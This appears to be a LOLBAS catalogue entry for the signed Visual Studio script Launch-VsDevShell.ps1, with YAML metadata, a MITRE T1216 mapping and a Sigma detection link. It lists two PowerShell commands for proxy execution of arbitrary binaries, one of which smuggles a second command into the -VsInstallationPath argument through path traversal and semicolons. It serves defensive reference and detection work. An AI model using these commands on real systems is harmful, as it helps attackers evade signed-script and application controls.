---
Acknowledgement:
- Person: Nasreddine Bencherch
Author: Nasreddine Bencherchali
Commands:
- Category: Execute
  Command: powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
  Description: Execute binaries from the context of the signed script using the "VsWherePath"
    flag.
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution
- Category: Execute
  Command: powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath
    "/../../../../../; {PATH:.exe} ;"
  Description: Execute binaries and commands from the context of the signed script
    using the "VsInstallationPath" flag.
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Proxy execution
Created: 2022-06-13
Description: Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell
  cmdlet
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_launch_vsdevshell.yml
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1
- Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1
Name: Launch-VsDevShell.ps1
Resources:
- Link: https://twitter.com/nas_bench/status/1535981653239255040
mitre_data:
  technique_ids:
  - T1216
tags:
- lolbas/osscripts
---

# Launch-VsDevShell.ps1

Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet

# Path(s)

- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1`
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1`

# Execute Commands

Execute binaries from the context of the signed script using the "VsWherePath" flag.

```batch
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
```

- **Usecase:** Proxy execution
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10, Windows 11



Execute binaries and commands from the context of the signed script using the "VsInstallationPath" flag.

```batch
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; {PATH:.exe} ;"
```

- **Usecase:** Proxy execution
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/nas_bench/status/1535981653239255040
# Acknowledgements

- Nasreddine Bencherchali (Authored, 2022-06-13)
- Nasreddine Bencherch